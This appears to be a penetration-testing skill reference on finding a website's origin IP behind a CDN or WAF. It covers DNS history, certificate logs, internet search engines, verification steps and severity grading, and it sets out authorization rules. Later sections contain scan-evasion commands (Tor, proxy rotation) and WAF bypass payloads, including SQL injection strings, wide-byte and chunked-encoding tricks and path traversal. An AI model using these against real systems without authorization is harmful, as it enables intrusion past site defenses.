# WAF / CDN Origin IP Discovery

> **Security Boundary Statement**
>
> Origin IP discovery is for **authorized testing only** to evaluate CDN/WAF bypass risk.
>
> - Discovery proves the origin IP is exposed; **do not bypass WAF to attack the origin directly** unless explicitly authorized
> - Historical DNS/certificate data is public information; using it to access the origin requires scope confirmation
> - Rate-limit all discovery queries; do not abuse third-party APIs (SecurityTrails, ZoomEye, etc.)
> - If origin IP discovery succeeds, report as a finding and **wait for authorization** before testing the origin
> - See `SKILL.md` for execution boundaries

## Third-Party API Compliance (mandatory before any space engine query)

| Platform | API Key Source | Free Tier Quota | Compliance Note |
|---|---|---|---|
| SecurityTrails | User must provide their own API key | 50 queries/month (free) | US-based; data export subject to CLOUD Act |
| ZoomEye | User must provide; `ZOOMEYE_KEY` env var | 10,000 results/month (free) | 360-hosted (China); KA clients may have contractual restrictions on automated querying |
| Fofa | User must provide; `FOFA_KEY` env var or web login | 100 queries (free) | China-hosted; check if engagement permits third-party target IP registration |
| Quake (360) | User must provide; `QUAKE_KEY` env var | Limited free tier | 360-hosted; same KA considerations as ZoomEye |
| Hunter (QAX) | User must provide; `HUNTER_KEY` env var | Limited free tier | China-hosted; government-affiliated targets may be auto-blocked by platform |
| Shodan | User must provide; `SHODAN_API_KEY` env var | 100 queries (free) | US-based; results may register target for Shodan monitoring |
| Censys | User must provide; `CENSYS_API_ID` + `CENSYS_API_SECRET` | 250 queries/month (free) | US-based; subject to CLOUD Act |

**Hard rules:**
1. **Never use the skill author's or any shared API key.** The operator must provide their own key.
2. **Quota awareness**: Before querying, confirm the operator has checked their remaining quota. A single burst scan can exhaust a free-tier monthly allocation.
3. **KA compliance**: If the engagement is with a Key Account client of ZoomEye/Fofa/Quake/Hunter, confirm the operator's contract permits using that platform to query the client's assets. Some KA agreements prohibit third-party security scanning platforms from indexing the client's infrastructure.
4. **Shodan registration risk**: Querying Shodan for a target may cause Shodan to add that target to its scan queue. Inform the operator before querying.
5. **Data residency**: If the engagement requires all data to remain in China, use only China-hosted platforms (ZoomEye, Fofa, Quake, Hunter). SecurityTrails/Shodan/Censys data transits US servers.

---

## Source: Application security assessment practice, Bypass firewalls, CDN fingerprinting research

## Validation Objectives

| Validation Content | Default | Requires Authorization | Prohibited |
|---|---|---|---|
| Historical DNS record lookup | ✓ Public data | - | Abuse API rate limits |
| Certificate Transparency search | ✓ Public data | - | - |
| DNS zone transfer attempt | ✓ Standard test | - | - |
| Origin access verification | ✓ Confirm IP responds | ✓ Test vulnerability on origin | Direct attack on origin |
| Full WAF bypass exploitation | ❌ | ✓ Authorized only | Un authorized origin exploitation |

---

## 1. Historical DNS Records

### SecurityTrails / DNSHistory

```bash
# SecurityTrails API (free tier: 50 queries/month)
curl -s "https://api.securitytrails.com/v1/history/{domain}/dns/a" \
  -H "APIKEY: $SECURITYTRAILS_KEY" | jq '.records[] | {ip: .values[0].ip, first_seen: .first_seen, last_seen: .last_seen}'

# DNSHistory.org
curl -s "https://dnshistory.org/dns-records/{domain}.html" | grep -oP '\d+\.\d+\.\d+\.\d+'

# ViewDNS.info
curl -s "https://viewdns.info/iphistory/?domain={domain}" | grep -oP '\d+\.\d+\.\d+\.\d+'
```

###dig + short

```bash
# Check all DNS record types for IP leaks
dig {domain} A +short
dig {domain} AAAA +short
dig {domain} MX +short       # Mail servers often reveal origin
dig {domain} NS +short
dig {domain} TXT +short      # SPF may contain origin IP ranges
dig {domain} CNAME +short

# SPF record — extract IP ranges (may reveal origin network)
dig {domain} TXT +short | grep spf
# Example: "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com ~all"
# 203.0.113.0/24 is likely the origin network
```

### DNS zone transfer

```bash
# Attempt zone transfer (rarely works but worth trying)
dig axfr {domain} @$(dig {domain} NS +short | head -1)

# Enumerate subdomains for IP leaks
for sub in www mail ftp admin api dev staging test blog shop; do
  ip=$(dig +short $sub.{domain} A)
  [ -n "$ip" ] && echo "$sub.{domain} -> $ip"
done
```

---

## 2. Certificate Transparency (CT) Logs

### crt.sh

```bash
# Find all subdomains via CT logs
curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq -r '.[].name_value' | sort -u

# Filter for internal/dev/staging certs that may reveal origin
curl -s "https://crt.sh/?q=%.{domain}&output=json" | jq -r '.[].name_value' | \
  grep -iE '(internal|dev|staging|test|admin|backend|origin|api-gw)'
```

### Censys

```bash
# Search for certificates matching domain
censys search "parsed.names: {domain}" --fields parsed.names,metadata.source_ip

# Find hosts serving the domain's certificate
censys search "parsed.names: {domain} and tags: trusted" --certs
```

---

## 3. Network Space Search Engines

### ZoomEye / Quake / Fofa (China-focused)

```bash
# Fofa — search for domain in HTTP response body/header
# Browser: https://fofa.info/result?qbase64=<base64_encoded_query>
# Query: header="{domain}" || body="{domain}" || cert="{domain}"

# ZoomEye — search for domain or IP
# Browser: https://www.zoomeye.org/searchResult?q=site:{domain}
# API:
curl -s "https://api.zoomeye.org/host/search?query=site:{domain}&page=1" \
  -H "API-KEY: $ZOOMEYE_KEY"

# Quake (360)
# Browser: https://quake.360.net/quake/#/searchResult?searchVal=service:http+{domain}
# Query: service:"http" and response:"{domain}"

# Hunter (QAX)
# Browser: https://hunter.qianxin.com/search?search={domain}
```

### Shodan

```bash
# SSL certificate search
shodan search "ssl:{domain}"

# HTTP title/header search
shodan search "http.title:\"{company_name}\""
shodan search "http.html:\"{domain}\""

# Organization search
shodan search "org:\"{company_name}\""
```

### Censys

```bash
# Certificate-based host discovery
censys search "parsed.names: {domain}" --hosts

# HTTP response body search
censys search "services.http.response.body: {domain}" --hosts
```

---

## 4. Origin IP Verification

```bash
# After finding candidate origin IP, verify it serves the target

# Method 1: Direct HTTP request with Host header
curl -s -o /dev/null -w "%{http_code}" -H "Host: {domain}" http://{candidate_ip}/
# 200/301/302 = likely the origin

# Method 2: Compare response hashes
cdn_hash=$(curl -s https://{domain}/ | md5sum)
origin_hash=$(curl -s -H "Host: {domain}" http://{candidate_ip}/ | md5sum)
# Match = confirmed origin

# Method 3: TLS certificate check
echo | openssl s_client -connect {candidate_ip}:443 -servername {domain} 2>/dev/null | \
  openssl x509 -noout -subject -issuer
# If subject contains {domain}, it's the origin

# Method 4: Response header comparison
curl -sI https://{domain}/ > cdn_headers.txt
curl -sI -H "Host: {domain}" http://{candidate_ip}/ > origin_headers.txt
diff cdn_headers.txt origin_headers.txt
# Look for CDN-specific headers missing in origin response
```

---

## 5. IP Pool / Proxy Scheduling

### When WAF blocks scan traffic

```bash
# Rotate User-Agent
UA_LIST=("Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" \
         "Mozilla/5.0 (X11; Linux x86_64)")

# Proxychains with residential proxies
proxychains4 curl -s https://{domain}/

# Tor circuit rotation
torify curl -s https://{domain}/

# Custom rate-limited scanner
while read path; do
  ua=${UA_LIST[$((RANDOM % ${#UA_LIST[@]}))]}
  curl -s -A "$ua" -w "%{http_code} %{url_effective}\n" \
    --delay 2-5 \
    "https://{domain}${path}"
done < wordlist.txt
```

---

## 6. Chinese WAF Specific Adaptation

### WAF Fingerprinting

| WAF | Detection Header / Response | Vendor |
|---|---|---|
| Aliyun WAF (Alibaba) | `Server: Tengine`, `X-Powered-By: ASP.NET` + `Set-Cookie: Aliyungf_TC` | Alibaba Cloud |
| Tencent EdgeOne | `Server: EdgeOne`, `X-Cache-Lookup: Hit From Upstream Cluster` | Tencent Cloud |
| Chaitin SafeLine | `X-SafeLine-Status: blocked`, response contains `safeline` | Chaitin |
| Knownsec Yunjiasu | `Server: yunjiasu-nginx`, header `X-Cdn-Provider: yunjiasu` | Knownsec |
| Wangsu (ChinaNetCenter) | `Server: WSCloud`, response headers with `WS` prefix | Wangsu |
| Baidu Cloud Accelerator | `Server: yunjiasu-nginx`, `X-Powered-By: Baidu` | Baidu |
| Huawei Cloud WAF | `Server: HuaweiCloud-Web-Protect` | Huawei Cloud |
| DBAPPSecurity WAF | Response body contains `waf_notify` or `error_page` | DBAPPSecurity |
| NSFOCUS WAF | `Server: NSFOCUS_WAF` | NSFOCUS |
| Sangfor WAF | Response body: `sangfor` or `safeline` patterns | Sangfor |

### Bypass Strategies

```
# Aliyun WAF — URL encoding + chunked transfer
# 1. Chunked transfer encoding bypasses rule engine
Transfer-Encoding: chunked

# 2. URL double encoding
?id=1%2527  ->  id=1%27  ->  id=1'

# 3. multipart/form-data bypass
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
------WebKitFormBoundary\r\nContent-Disposition: form-data; name="id"\r\n\r\n1'\r\n

# Tencent EdgeOne — HTTP/2 downgrade + path obfuscation
# 1. Exploit H2 pseudo-headers to bypass
:method: POST
:path: /api/v1/login

# 2. Path encoding bypass
/api/v1/..;/admin/users  ->  /admin/users

# Chaitin SafeLine — JSON parsing differential
# 1. JSON Unicode escape
{"id": "' OR 1=1--"}

# 2. JSON comment bypass (some JSON parsers ignore comments)
{"id": "1'/**/OR/**/1=1--"}

# General Chinese WAF bypass
# 1. Exploit Chinese fullwidth characters
１９２．０．２．１ -> 192.0.2.1

# 2. Exploit GBK/GB2312 encoding differential (wide byte)
%df%27 -> [wide-byte]' (consumes backslash)

# 3. Chunked + encoding combination
POST /api HTTP/1.1
Transfer-Encoding: chunked
Content-Type: application/json

5
{"id":
7
"1' OR 1"
5
 "=1"}
0
```

---

## Severity Classification

Origin IP discovery defaults to low severity — collecting candidate IPs / historical DNS hits does not equal finding the real origin. Only when **real origin IP confirmed and origin directly accessible (actually bypasses WAF)** is High required.

| Actual case | Severity | Note |
|---------|------|------|
| Real origin IP found and directly accessible (Host header/cert/response fingerprint confirmed, bypasses WAF) | High | WAF bypass chain closure, origin exposed and directly reachable |
| Suspected origin IP found but reachability not confirmed (historical record hit, fingerprint/response comparison not completed) | Medium | Hint exists, chain not closed |
| Only candidate IPs collected (not confirmed as origin, raw DNS/CT/space engine results only) | Low | Information gathering only |

**Key judgment**: High core criterion is "origin reachability confirmed" — must use at least one of Host header direct connection / TLS certificate subject / response fingerprint comparison to confirm candidate IP actually hosts the target domain. Historical DNS records / raw space engine hits only record as Medium/Low.

---

## Detection Checklist

| Item | Check | Pass Criteria |
|---|---|---|
| Historical DNS | Query CT logs and DNS history | No origin IP in historical records |
| SPF/MX leak | Check SPF record and MX records | No private IP ranges in SPF |
| CT log subdomains | Search crt.sh for internal certs | No internal/origin subdomain certs |
| Space engine | Search Fofa/ZoomEye/Shodan | Origin IP not indexed |
| WAF fingerprint | Send probe requests | WAF correctly blocks malicious input |
| Origin access | Verify origin IP directly | Origin IP not reachable or requires auth |
| Rate limiting | Send rapid requests | Rate limiting active and reasonable |
